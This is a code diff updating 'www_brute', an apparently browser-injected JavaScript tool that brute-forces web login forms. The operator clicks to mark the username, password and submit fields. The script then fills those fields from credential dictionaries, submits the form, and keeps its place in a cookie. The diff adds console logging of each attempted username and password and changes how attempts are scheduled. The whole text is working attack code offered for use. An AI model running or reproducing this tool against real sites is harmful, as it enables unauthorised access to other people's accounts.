@@ -13,9 +13,9 @@ function init()
 {
 	console.info('[!] click on ' + ((user_field) ? '' : '<user> ') + ((pass_field) ? '' : '<pass> ') + ((submit_field) ? '' : '<submit> ') + 'fields' )
 	document.getElementsByTagName('body')[0].addEventListener('click', function (e) {
-  	if(! user_field )
+		if(! user_field )
 		{
-		  user_field = save_element( e.target, 'user' )
+			user_field = save_element( e.target, 'user' )
 			console.log('[*] select <user> field ' + user_field)
 		}
 		else if(! pass_field )
@@ -209,8 +209,8 @@ function do_brute(intr)
 	}
 	else*/
 		brute_offset = parseInt(brute_offset)
-	var offset = 0
-
+	var offset = 0,
+		user, password
 	for( var dict = 0; dict < window.__brute.length; dict++ )
 	{
 		if(! is_allow( window.__brute[dict] ) )
@@ -219,8 +219,11 @@ function do_brute(intr)
 		{
 			if( brute_offset == offset )
 			{
-				user_field.value = window.__brute[dict].combo[i][0]
-				pass_field.value = window.__brute[dict].combo[i][1]
+				user = window.__brute[dict].combo[i][0]
+				password = window.__brute[dict].combo[i][1]
+				user_field.value = user
+				pass_field.value = password
+				console.log("try " + user + ":" + password)
 				send()
 				return
 			}
@@ -235,8 +238,11 @@ function do_brute(intr)
 				{
 					if( brute_offset == offset )
 					{
-						user_field.value = window.__brute[dict].users[j]
-						pass_field.value = window.__brute[dict].passwords[i]
+						user = window.__brute[dict].users[j]
+						password = window.__brute[dict].passwords[i]
+						user_field.value = user
+						pass_field.value = password
+						console.log("try " + user + ":" + password)
 						send()
 						return
 					}
@@ -287,28 +293,29 @@ function brute()
 		reset()
 		throw brute_exception("force stoping")
 	}
-	brute_offset = get_cookie('__offset=')
-	if( ( brute_offset != undefined || in_url('__init') ) )
+
+	if( in_url('__init') )
 	{
 		brute_offset = 0
 		save_cookie('__offset=0')
+		init()
+		return
+	}
+
+	if( ( ( brute_offset = get_cookie('__offset=') ) != undefined ) )
+	{
 		function get_userpass_fields()
 		{
 			user_field = get_element('user')
 			pass_field = get_element('pass')
 			submit_field = get_element('submit')
 			if(user_field && pass_field && submit_field)
-				intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
-				//do_brute(0)
+				//intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
+				do_brute(0)
 			else
 				setTimeout(get_userpass_fields, 1000)
 		}
 		get_userpass_fields()
-	}
-	if( in_url('__init') )
-	{
-		init()
-		return
 	}
 }
 
@@ -328,7 +335,7 @@ if( in_frame() )
 
 try
 {
-	console.info('www_brute v0.16')
+	console.info('www_brute v0.17')
 	enum_dicts()
 	setInterval( brute, 1000 )
 }
